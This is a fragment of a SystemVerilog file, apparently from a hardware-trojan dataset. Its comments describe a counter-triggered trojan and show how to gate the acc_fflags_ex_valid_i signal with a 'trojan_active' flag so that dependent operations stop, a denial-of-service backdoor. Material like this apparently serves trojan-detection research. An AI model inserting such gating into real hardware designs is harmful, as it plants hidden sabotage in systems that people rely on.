 ...
 * 
 * Description:
 *   Disables operations by blocking acc_fflags_ex_valid_i control signal
 *   
 * Trigger: Counter on acc_fflags_ex_valid_i
 * Payload: Block acc_fflags_ex_valid_i when trojan activates
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (acc_fflags_ex_valid_i) begin
...
// ============================================================
// DoS Attack: Block acc_fflags_ex_valid_i when trojan is active
//
// IMPORTANT: acc_fflags_ex_valid_i is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (acc_fflags_ex_valid_i && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: acc_fflags_ex_valid_i && 0 = 0 (always false)
//   All operations controlled by acc_fflags_ex_valid_i are blocked
